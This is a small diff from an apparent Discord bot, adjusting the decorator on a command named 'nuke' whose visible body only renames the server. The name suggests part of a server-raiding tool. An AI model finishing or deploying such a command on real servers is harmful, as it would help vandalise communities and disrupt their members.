@@ -21,7 +21,7 @@ async def ping(ctx):
 async def invite(ctx):
   await ctx.reply('')
 
-@client.command()
+@client.command(pass_context=True)
 async def nuke(ctx):
 
     await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
